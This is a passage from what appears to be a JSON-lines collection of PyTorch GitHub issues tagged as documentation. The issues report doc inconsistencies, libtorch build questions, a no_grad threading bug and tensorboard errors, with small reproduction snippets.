https://pytorch.org/docs/stable/torch.html#torch.unique\r\n\r\n![image](https://user-images.githubusercontent.com/44090/59552925-7fdf1d80-8f8d-11e9-8eb2-af0919e37b00.png)\r\n\r\nunique_consecutive is OK, so the correct doc string could be copied from there:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/59552942-b7e66080-8f8d-11e9-95b6-52979a5994d1.png)\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nHello all,\r\n\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET). While generating the API from the docs I noticed this inconsistency in [Tensor.sum_to_size](https://pytorch.org/docs/stable/tensors.html#torch.Tensor.sum_to_size): \r\n\r\nThe text mentions a parameter `other` which is not shown in the parameter list. "},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nIn `torch.utils.data` Samplers' [documentation](https://pytorch.org/docs/stable/data.html) I find the use of word \"element\" confusing.\r\nFor example, the description of `torch.utils.data.SequentialSampler` says:\r\n> Samples elements sequentially, always in the same order.\r\n\r\n`torch.utils.data.SequentialSampler` doesn't return elements of an object, but indices of those elements. This also applies to other samplers and is not clear from documentation.\r\n\r\nThe unfortunate example of `torch.utils.data.BatchSampler` only magnifies this confusion.\r\n`list(BatchSampler(SequentialSampler(range(10)), batch_size=3, drop_last=False))`\r\n`[[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]]`\r\n`list(BatchSampler(SequentialSampler(range(10)), batch_size=3, drop_last=True))`\r\n`[[0, 1, 2], [3, 4, 5], [6, 7, 8]]`"},{"labels":["documentation",null,null,null,null],"text":"Steps to reproduce: run this test:\r\n\r\n```\r\n      def test_conv_backcompat(self):\r\n          from torch.serialization import SourceChangeWarning\r\n          # This file was generated by running on PyTorch 1.0.1 on Python 2:\r\n          #\r\n          #     import torch\r\n          #     from torch import nn\r\n          #     m = nn.Conv2d(1, 1, 1)\r\n          #     torch.save(m, 'legacy_conv2d.pt')\r\n          #\r\n          path = download_file('https://download.pytorch.org/test_data/legacy_conv2d.pt')\r\n          with warnings.catch_warnings():\r\n              warnings.simplefilter('ignore', SourceChangeWarning)\r\n              m = torch.load(path)\r\n          input = torch.randn((1, 1, 1, 1), dtype=torch.float)\r\n          self.assertEqual(m(input).size(), (1, 1, 1, 1))\r\n```\r\n\r\nThe problem is that the docstring in the module has a Unicode character and our unpickler doesn't specify any encoding (thus defaulting to ascii)."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nFollowing the discussions in https://github.com/facebookresearch/PyTorch-BigGraph/issues/51#issuecomment-501293200, I'm opening this issue to let you know that the `cdist` function introduced in the last release of PyTorch [it has not been documented yet](https://pytorch.org/docs/stable/search.html?q=cdist&check_keywords=yes&area=default).\r\n"},{"labels":[null,"documentation",null],"text":""},{"labels":["documentation",null],"text":"In https://github.com/pytorch/pytorch/issues/21679#issue-455182954 I saw a user do this:\r\n\r\n```\r\n  auto m = torch::nn::BatchNorm(torch::nn::BatchNormOptions(2));\r\n  m->weight = torch::from_blob(&data[0][0],{2});\r\n  m->bias = torch::from_blob(&data[0][2],{2});\r\n  m->running_mean = torch::from_blob(&data[0][4],{2});\r\n  m->running_var = torch::from_blob(&data[0][6],{2});\r\n```\r\n\r\nThis is bad, you shouldn't do it. The reason is because you have created a new tensor and stuck it on the parameter slot, but the *registered* parameter (stored in the parameters vector) isn't updated in this case.\r\n\r\nI didn't see anything documented against this."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nAs described [here](https://pytorch.org/docs/stable/torch.html#torch.arange) the output size of `torch.arange` is `int((end-start)/step)` (i.e. the floor). But it's the ceiling:\r\n\r\n```python\r\nimport torch\r\nimport numpy as np\r\ndef verify_out_shape(start, end, steps): \r\n    for s in steps: \r\n        dif = end-start \r\n        assert torch.arange(start, end, step=s).size(0) == np.ceil(dif/s)\r\n\r\nverify_out_shape(1, 400, [0.5, 0.7, 0.3, 1.3])  \r\nverify_out_shape(23, 731, [0.5, 0.7, 0.3, 1.3])  \r\n```"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n[torch.bernoulli](https://pytorch.org/docs/stable/torch.html#torch.bernoulli)  shows two extra parameters other than the two documented ones: * and generator=None\r\n\r\nWhat are they?\r\n\r\n"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nIt likely should be mentioned that the [`attn_mask`](https://github.com/pytorch/pytorch/blob/master/torch/nn/modules/activation.py#L767) argument of MHA is an additive mask (-inf masks values), rather than the standard multiplicative mask (0 masks values). Perhaps even enforce a value check (all values should be 0 / -inf ?, otherwise print warning?)"},{"labels":[null,"documentation",null,null],"text":"## ‚ùì Questions and Help\r\n\r\nI want to convert pytorch to onnx in pytorch nightly 1.1.0. The input type is ImageList. The outputput type is BoxList. \r\nThe convert code is\r\n`\r\ndummy_input = torch.autograd.Variable(torch.randn(1, 3, 640, 800).cuda())\r\ntorch.onnx.export(self.model, dummy_input, \"convert_models/onnx_model.onnx\")\r\n`\r\nBut I meet an error.\r\n\r\n> RuntimeError: Only tuples, lists and Variables supported as JIT inputs, but got BoxList.\r\n\r\nThanks.\r\n"},{"labels":[null,null,"documentation",null],"text":" I have a question about data manipulation with the C++ in libtorch.\r\nFor example, in pytorch I could deal with tensor like this:\r\nimg[:, :10, :] = 0\r\nbut with libtorch I don't know how to do as same as pytorch,if I use for circle,then it will be very slow,I want to know if there is any function with libtorch can do this,thank you very much.\r\n"},{"labels":[null,null,null,"documentation",null],"text":"Hi,\r\nhttps://github.com/pytorch/pytorch/blob/95eb9339c10ffc4d74312f35ac15fffa61596de1/torch/utils/collect_env.py#L114\r\nI find this function `get_running_cuda_version` ignores the existence of cudatoolkit in conda env, instead it uses `nvcc --version` , the system wide installed CUDA as a reference to get the cuda version. \r\nThis may be confusing if someone has cudatoolkit with a different cuda version installed.\r\nCan it be improved? Thanks."},{"labels":["documentation",null],"text":"E.g. go to https://pytorch.org/docs/stable/ and look at the HTML title of the page. It is `PyTorch documentation ‚Äî PyTorch master documentation`\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\nhttps://pytorch.org/docs/stable/torch.html#torch.full_like\r\n\r\nThe behavior when the out tensor does not match type or device of input tensor is not obvious."},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nFor tensor creation ops like `torch.zeros` and `torch.ones`, the docs [0], [1] use `sizes` as the first argument to the function call while the correct argument is `size`.  This is tested for pytorch 1.1 installed using pip on ubuntu 19.04\r\n\r\nAn example\r\n\r\n```\r\n>>> torch.zeros(2, 3)\r\ntensor([[0., 0., 0.],\r\n        [0., 0., 0.]])\r\n>>> torch.zeros(sizes = (2, 3))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: zeros() missing 1 required positional arguments: \"size\"\r\n>>> torch.zeros(size = (2, 3))\r\ntensor([[0., 0., 0.],\r\n        [0., 0., 0.]])\r\n>>> torch.ones(sizes = (2, 3))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: ones() missing 1 required positional arguments: \"size\"\r\n>>> torch.ones(size = (2, 3))\r\ntensor([[1., 1., 1.],\r\n        [1., 1., 1.]])\r\n```\r\n\r\n[0]: https://pytorch.org/docs/master/torch.html#torch.zeros\r\n[1]: https://pytorch.org/docs/master/torch.html#torch.ones"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\n```python\r\ndef normal_(tensor, mean=0., std=1.):\r\n    # type: (Tensor, float, float) -> Tensor\r\n    r\"\"\"Fills the input Tensor with values drawn from the normal\r\n    distribution :math:`\\mathcal{N}(\\text{mean}, \\text{std})`.\r\n    ...\r\n    \"\"\"\r\n```\r\nthe latex should be\r\n$$\r\n\\mathcal{N}(\\text{mean},\\text{std}^2)\r\n$$"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe attention mask shape should be `(L, S)` since it is added to the attention weights which is of shape (N, L, S). This is only in master, and not on pytorch.org yet.\r\n\r\nhttps://github.com/pytorch/pytorch/pull/20850"},{"labels":[null,null,null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nBelow is all the library generated which does not contain the libtorch.a. No error messages are observed.\r\n\r\nlibprotobuf-lite.a\r\nlibclog.a\r\nlibcpuinfo_internals.a\r\nlibcpuinfo.a\r\nlibpthreadpool.a\r\nlibqnnpack.a\r\nlibnnpack_reference_layers.a\r\nlibonnxifi_loader.a\r\nlibonnxifi_dummy.so\r\nlibfoxi_loader.a\r\nlibonnxifi.so\r\nlibfoxi_dummy.so\r\nlibfoxi.so\r\nlibgloo.a\r\nlibprotobuf.a\r\nlibgloo_builder.a\r\nlibprotoc.a\r\nlibonnx_proto.a\r\nlibc10.a\r\nlibonnx.a\r\nlibCaffe2_perfkernels_avx2.a\r\nlibCaffe2_perfkernels_avx.a\r\nlibcaffe2_protos.a\r\nlibnnpack.a\r\nlibmkldnn.a\r\nlibcaffe2.a\r\nlibTHD.a\r\nlibc10d.a\r\nlibtorch.so\r\nlibcaffe2_detectron_ops.so\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\nI follow offical steps to clone the lastest code\r\n```\r\nbranch master\r\nlast commit 7b9ee598d64bd35cad9afea8276ebd1c069620d9\r\nAuthor: Jongsoo Park <jongsoo@fb.com>\r\n```\r\n\r\nConfigure environment variables\r\n\r\n```\r\nexport NO_CUDA=1  //do not need GPU here\r\nexport BUILD_SHARED_LIBS=OFF //this is instructed here https://github.com/pytorch/pytorch/blob/master/docs/libtorch.rst\r\nexport BUILD_TEST=False //I set this, b/c test binary is not needed here\r\n```\r\n\r\n\r\nCommand to build the library\r\n```\r\nmkdir build && cd build\r\npython ../tools/build_libtorch.py\r\n```\r\n\r\nEnsure that dependencies are installed \r\n`conda install numpy ninja pyyaml mkl mkl-include setuptools cmake cffi typing`\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\nlibtorch.a is generated\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.1.0a0+7b9ee59\r\nIs debug build: No\r\nCUDA used to build PyTorch: Could not collect\r\n\r\nOS:  Red Hat\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-5)\r\nCMake version: version 3.12.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: No\r\nCUDA runtime version: Could not collect\r\n\r\nNvidia driver version: 410.104\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.0\r\n[pip3] numpydoc==0.7.0\r\n[pip3] torch==1.1.0\r\n[pip3] torchvision==0.2.2.post3\r\n[conda] mkl                       2019.3                      199  \r\n[conda] mkl-include               2019.3                      199  \r\n[conda] mkl-service               1.1.2                    py36_3  \r\n[conda] mkl_fft                   1.0.1            py36h3010b51_0  \r\n[conda] mkl_random                1.0.1            py36h629b387_0  \r\n[conda] scikit-learn              0.19.1          py36_nomklh6cfcb94_0  \r\n[conda] scipy                     1.1.0           py36_nomklh9c1e066_0  \r\n[conda] torch                     1.1.0a0+7b9ee59           <pip>\r\n[conda] torch                     1.1.0                     <pip>\r\n[conda] torchvision               0.2.2.post3               <pip>\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nAs mentioned in [this post ](https://discuss.pytorch.org/t/a-possible-bug-in-torch-nn-functional-conv1d-2d/44066)\r\n\r\n[These docs for functional conv opperations](https://pytorch.org/docs/stable/nn.html?highlight=conv1d#torch.nn.functional.conv1d) show a optional argument `padding_mode`. However when specifying this argument an exception is raised:\r\n\r\n`TypeError: conv1d() got an unexpected keyword argument 'padding_mode'`\r\n\r\nUpon inspection of the modular Conv layers code, it can be seen that the `padding_mode` argument is used to apply padding before calling the functional conv:\r\nhttps://github.com/pytorch/pytorch/blob/v1.1.0/torch/nn/modules/conv.py#L192\r\n\r\nSo I believe the `padding_mode` argument should be removed from the **functional** conv docs, as this argument applies to the **modular** Conv layers only\r\n\r\nThanks "},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nThere is an image on the main page of this repo:\r\n![image](https://user-images.githubusercontent.com/5480856/57926458-fc5dde00-78b3-11e9-819c-96119d99026e.png)\r\n\r\nLooks like the numbers on the result tensor are wrong (and pretty unreadable btw).\r\n"},{"labels":[null,null,"documentation",null,null,null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\nAn outer torch.no_grad() is ignored inside a thread (e.g. `ThreadPoolExecutor.map`).\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n``` python\r\nimport torch\r\nfrom concurrent.futures import ThreadPoolExecutor\r\n\r\n# dummy data and network\r\ninput_data = torch.arange(10, dtype=torch.float32)\r\nnet = torch.nn.Sequential(\r\n    torch.nn.Linear(10, 1)\r\n)\r\n\r\nwith ThreadPoolExecutor(2) as ex:\r\n    with torch.no_grad():\r\n        # no_grad is working\r\n        assert net(input_data).grad_fn is None\r\n        \r\n        # Should fail because of the \"not\" <-------------------------------\r\n        assert list(ex.map(net, [input_data]))[0].grad_fn is not None\r\n        \r\n        # no_grad is working\r\n        assert list(ex.map(torch.no_grad()(net), [input_data]))[0].grad_fn is None\r\n        \r\n        # no_grad is working\r\n        assert net(input_data).grad_fn is None\r\n        \r\n    # Can calculate the gradient\r\n    assert net(input_data).grad_fn is not None\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\nThe result of `list(ex.map(net, [input_data]))` should not have a `grad_fn`.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Ubuntu 18.04.2 LTS\r\nGCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: \r\nGPU 0: GeForce RTX 2070\r\nGPU 1: GeForce RTX 2070\r\n\r\nNvidia driver version: 415.25\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.5.0\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.3\r\n[pip] numpy-ringbuffer==0.2.1\r\n[pip] numpydoc==0.8.0\r\n[pip] pytorch-sconce==1.3.4\r\n[pip] pytorchviz==0.0.1\r\n[pip] torch==1.1.0\r\n[pip] torch-nightly==1.0.0.dev20181114\r\n[pip] torchvision==0.2.1\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.3                      199  \r\n[conda] mkl-service               1.1.2            py36he904b0f_5  \r\n[conda] mkl_fft                   1.0.10           py36ha843d7b_0  \r\n[conda] mkl_random                1.0.2            py36hd81dba3_0  \r\n[conda] torch                     1.1.0                    pypi_0    pypi\r\n[conda] torchvision               0.2.2.post3              pypi_0    pypi\r\n\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":[null,"documentation",null,null],"text":"I propose something like this to find automatically members missing from rst (could be put on some doc page as well). This could also be improved to make a list of public members missing docs altogether.\r\n```python\r\nrst_dir = 'docs/source'\r\n\r\nrst = '\\n'.join(open(os.path.join(rst_dir, rst_file)).read() for rst_file in os.listdir(rst_dir))\r\n\r\nmembers = lambda obj : [(member, getattr(getattr(obj, member), '__doc__') is not None) for member in dir(obj) if not member.startswith('_') and member not in rst]\r\n\r\ndoctodo = members(torch) + members(torch.nn) + members(torch.nn.functional)\r\n```"},{"labels":[null,"documentation",null],"text":"Apparently, it's really popular for users to use multiprocessing + spawn in ipython/Jupyter notebooks. For example, #17680; also, https://fb.workplace.com/groups/1405155842844877/permalink/2766399306720517/ (FB-only)\r\n\r\nThere is a loaded footgun that occurs when you combine these three ingredients: the spawn method will **run everything in your notebook top-level** (and you probably have live statements on your notebook top-level; that's why you're running in a notebook) before actually running the requested function in question. This is unexpected for users, who just expected to be directly dropped into the function in question, and leads to all sorts of fun (`mp.set_start_method` reports that it's already been called; deadlock when the child process starts trying to run the same thing again).\r\n\r\nIt would be *really good* to document this somewhere people are actually going to read it, and maybe add some runtime checks to detect if this situation is happening and help users do the right thing.\r\n\r\ncc @colesbury @chandlerzuo "},{"labels":[null,"documentation",null],"text":"Quite a few times (e.g. https://github.com/pytorch/pytorch/issues/20301) some examples from docs became obsolete and ran unnoticed.\r\n\r\nProposal: ability to mark some examples in docs as tests and run them on CI and check execution for errors, warnings etc."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nDocs for `torch.nn.functional.gumbel_softmax`. \r\n\r\nFunction `gumbel_softmax` docstring entry for `Gumbel-Softmax distribution` has two Arxiv links:\r\n\r\n    .. _Gumbel-Softmax distribution:\r\n        https://arxiv.org/abs/1611.00712\r\n        https://arxiv.org/abs/1611.01144\r\n\r\nThe official [PyTorch docs](https://pytorch.org/docs/stable/nn.html#gumbel-softmax) concatenate the two links together to make [https://arxiv.org/abs/1611.00712https://arxiv.org/abs/1611.01144](https://arxiv.org/abs/1611.00712https://arxiv.org/abs/1611.01144) which is clearly an invalid link.\r\n\r\n*Note*: I am not sure how you would like this fixed.  It might be cleanest to separate it into two links. If you let me know, I can issue a pull request."},{"labels":[null,null,null,null,"documentation",null],"text":"On Slack, Geoffrey Yu asked:\r\n\r\n> Are there instructions for building libtorch from source? I feel like I'm missing something since I've tried building with `tools/build_libtorch.py`. However the build output doesn't seem to have the same structure as the prebuilt libtorch that you can download on pytorch.org\r\n\r\n@pjh5 responded: \"If you're curious, here's exactly what builds the libtorches https://github.com/pytorch/builder/blob/master/manywheel/build_common.sh#L120 . It's mostly tools/build_libtorch.py but also copies some header files from a wheel file\"\r\n\r\nThis is not mentioned at all in the \"how to build libtorch\" documentation: https://github.com/pytorch/pytorch/blob/master/docs/libtorch.rst Normally we give build instructions in README but there are no libtorch build instructions in the README. Additionally, the C++ API docs https://pytorch.org/cppdocs/ don't explain how to build from source.\r\n\r\nSome more users being confused about the matter:\r\n* https://discuss.pytorch.org/t/building-libtorch-c-distribution-from-source/27519/2\r\n* https://github.com/pytorch/pytorch/issues/20156\r\n\r\n"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nI raise this issue because I encountered many warnings and errors compiling the documentation.\r\nI checked out version 1.1.0, and followed the instruction of \"Building the Documentation\" by running pip install -r requirements, and then make latexpdf. I already have texlive, latexmk, and other necessary latex packages installed. My system is Ubuntu 19.04.\r\n\r\nErrors include missing references, missing \"$\", extra alignment, etc. Given how verbose latex's error list is, I am not listing everything here. I can upload a log file of the errors if that is desired.\r\n\r\nIs there any specific version of latex that is required? \r\n\r\nThe reason I try to get a PDF is that PDF is so much better as a single file format when I don't get internet. PDF readers can handle very long PDF files smoothly, while my browser had a hard time to load a large single-file html is hard to handle by my browser. In this use case, PDF is overall a better solution.\r\n\r\nOn the other hand, I don't really know where the errors originated (the docs, Sphinx, or latex version). So, **maybe a better solution would be providing a downloadable PDF file of every release on the website**? I suppose that if the pytorch team already have a testing pipeline for documentation generation, it wouldn't be too much work to post the pdf file on the website. However, I don't really know if that fits into your pipeline.\r\n\r\nThank you very much!"},{"labels":[null,null,"documentation",null,null],"text":"I find that matrix multiplication is slower in C++ API, so I write the same code in C++ and python and record their execution times, code is as following:\r\n\r\n**C++:**\r\n```\r\n#include<torch/torch.h>\r\n#include<iostream>\r\n#include <chrono>\r\n\r\nint main(){\r\n\ttorch::Tensor tensor = torch::randn({2708, 1433});\r\n\ttorch::Tensor weight = torch::randn({1433, 16});\r\n\tauto start = std::chrono::high_resolution_clock::now();\r\n\ttensor.mm(weight);\r\n\tauto end = std::chrono::high_resolution_clock::now();\r\n\tstd::cout<< \"C++ Operation Time(s) \" << std::chrono::duration<double>(end - start).count() << \"s\" << \tstd::endl;\r\n\treturn 0;\r\n}\r\n```\r\n\r\n**Result**:\r\n```\r\nC++ Operation Time(s) 0.082496s\r\n```\r\n\r\n**python:**\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\n\r\ntensor = torch.randn(2708, 1433)\r\nweight = torch.randn(1433, 16)\r\nt0 = time.time()\r\ntensor.mm(weight)\r\nt1 = time.time()\r\nprint(\"Python Operation Time(s) {:.4f}\".format(t1 - t0))\r\n```\r\n\r\n**Result**:\r\n```\r\nPython Operation Time(s) 0.0114\r\n```\r\n\r\n**Testing Environment:**\r\n```\r\nubuntu 16.04\r\ngcc version 5.4.0\r\npython version 3.7.3\r\npytorch version 1.0.1\r\n```\r\n\r\nIt's not a small difference, why is it happen???\r\n"},{"labels":[null,"documentation",null,null],"text":"```\r\nimport torch\r\nimport torchvision\r\nfrom torch.utils.tensorboard import SummaryWriter\r\nfrom torchvision import datasets, transforms\r\n```\r\n\r\n  # Writer will output to ./runs/ directory by default\r\n```\r\nwriter = SummaryWriter()\r\n\r\ntransform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.5,), (0.5,))])\r\ntrainset = datasets.MNIST('mnist', train=True, download=True, transform=transform)\r\ntrainloader = torch.utils.data.DataLoader(trainset, batch_size=64, shuffle=True)\r\nmodel = torchvision.models.resnet50(False)\r\n  # Have ResNet model take in grayscale rather than RGB\r\nmodel.conv1 = torch.nn.Conv2d(1, 64, kernel_size=7, stride=2, padding=3, bias=False)\r\nimages, labels = next(iter(trainloader))\r\ngrid = torchvision.utils.make_grid(images)\r\nwriter.add_image('images', grid, 0)\r\nwriter.add_graph(model, images)\r\nwriter.close()\r\n\r\n```\r\n\r\n> Downloading http://yann.lecun.com/exdb/mnist/train-images-idx3-ubyte.gz\r\n> Downloading http://yann.lecun.com/exdb/mnist/train-labels-idx1-ubyte.gz\r\n> Downloading http://yann.lecun.com/exdb/mnist/t10k-images-idx3-ubyte.gz\r\n> Downloading http://yann.lecun.com/exdb/mnist/t10k-labels-idx1-ubyte.gz\r\n> Processing...\r\n> Done!\r\n> Error occurs, No graph saved\r\n> Traceback (most recent call last):\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/utils/tensorboard/_pytorch_graph.py\", line 276, in graph\r\n>     trace, _ = torch.jit.get_trace_graph(model, args)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/jit/__init__.py\", line 231, in get_trace_graph\r\n>     return LegacyTracedModule(f, _force_outplace, return_inputs)(*args, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 493, in __call__\r\n>     result = self.forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/jit/__init__.py\", line 294, in forward\r\n>     out = self.inner(*trace_inputs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 491, in __call__\r\n>     result = self._slow_forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 481, in _slow_forward\r\n>     result = self.forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torchvision/models/resnet.py\", line 149, in forward\r\n>     x = self.avgpool(x)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 491, in __call__\r\n>     result = self._slow_forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 481, in _slow_forward\r\n>     result = self.forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/pooling.py\", line 563, in forward\r\n>     self.padding, self.ceil_mode, self.count_include_pad)\r\n> RuntimeError: Given input size: (2048x1x1). Calculated output size: (2048x-5x-5). Output size is too small at /pytorch/aten/src/THNN/generic/SpatialAveragePooling.c:48\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\n> Traceback (most recent call last):\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/pydevd.py\", line 1741, in <module>\r\n>     main()\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/pydevd.py\", line 1735, in main\r\n>     globals = debugger.run(setup['file'], None, None, is_module)\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/pydevd.py\", line 1135, in run\r\n>     pydev_imports.execfile(file, globals, locals)  # execute the script\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/_pydev_imps/_pydev_execfile.py\", line 18, in execfile\r\n>     exec(compile(contents+\"\\n\", file, 'exec'), glob, loc)\r\n>   File \"/home/tian/Desktop/ai/machine-learn/Image_recognition/tensorboard_test.py\", line 18, in <module>\r\n>     writer.add_graph(model, images)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/utils/tensorboard/writer.py\", line 534, in add_graph\r\n>     self._get_file_writer().add_graph(graph(model, input_to_model, verbose, **kwargs))\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/utils/tensorboard/_pytorch_graph.py\", line 279, in graph\r\n>     _ = model(*args)  # don't catch, just print the error message\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 493, in __call__\r\n>     result = self.forward(*input, **kwargs)\r\n> TypeError: forward() takes 2 positional arguments but 65 were given\r\n\r\n- \r\n![2019-05-06 14-14-41 ÁöÑÂ±èÂπïÊà™Âõæ](https://user-images.githubusercontent.com/37957822/57209028-52579980-7009-11e9-9e16-4c694ae08c33.png)\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe example in https://pytorch.org/docs/stable/nn.html#tripletmarginloss isn't very clear. It doesn't specify which input is the anchor, positive, and negative. \r\nCurrent:\r\n>>> triplet_loss = nn.TripletMarginLoss(margin=1.0, p=2)\r\n>>> input1 = torch.randn(100, 128, requires_grad=True)\r\n>>> input2 = torch.randn(100, 128, requires_grad=True)\r\n>>> input3 = torch.randn(100, 128, requires_grad=True)\r\n>>> output = triplet_loss(input1, input2, input3)\r\n>>> output.backward()\r\n\r\nProposed:\r\n>>> triplet_loss = nn.TripletMarginLoss(margin=1.0, p=2)\r\n>>> anchor = torch.randn(100, 128, requires_grad=True)\r\n>>> positive = torch.randn(100, 128, requires_grad=True)\r\n>>> negative = torch.randn(100, 128, requires_grad=True)\r\n>>> output = triplet_loss(anchor, positive, negative)\r\n>>> output.backward()\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://pytorch.org/docs/stable/nn.html?highlight=grucell#torch.nn.GRUCell\r\n$$\r\n\\begin{aligned} r &=\\sigma\\left(W_{i r} x+b_{i r}+W_{h r} h+b_{h r}\\right) \\\\ z &=\\sigma\\left(W_{i z} x+b_{i z}+W_{h z} h+b_{h z}\\right) \\\\ n &=\\tanh \\left(W_{i n} x+b_{i n}+r *\\left(W_{h n} h+b_{h n}\\right)\\right) \\\\ h^{\\prime} &=(1-z) * n+z * h \\end{aligned}\r\n$$\r\n\r\nFor the last one , It should be (1-z) * h+z * n. \r\n$$\r\nh^{\\prime}=(1-z) * h+z * n\r\n$$\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe documentation for the newly introduced `CosineAnnealingWarmRestarts` learning rate scheduler (#17226) does not appear on the website (see [here](https://pytorch.org/docs/stable/optim.html); the location where it should be).\r\n\r\nFurthermore, looking at the [source code of the function](https://github.com/pytorch/pytorch/blob/master/torch/optim/lr_scheduler.py#L699), I am very confused about how to use the scheduler.\r\n\r\nSpecifically, if we look at the documentation of `.step()`, we first see a clear typo, where `CosineAnnealingWarmRestarts` is called `SGDR`. But the provided example is not sufficient to use as a reference. Where did the value 26 come from and why, and what does it have to do with 10 iterations? Also, [the paper](https://arxiv.org/abs/1608.03983) on which this scheduler is based states that the LR should be updated every _batch_, not epoch. I believe the statement in the documentation `SGDR.step(0.1), SGDR.step(0.2)` is referring to this, but I am lost in the example.\r\n\r\nIf I try to ignore the docstring and look at the source code, my best guess is that the correct message for the docstring in `.step` should be something 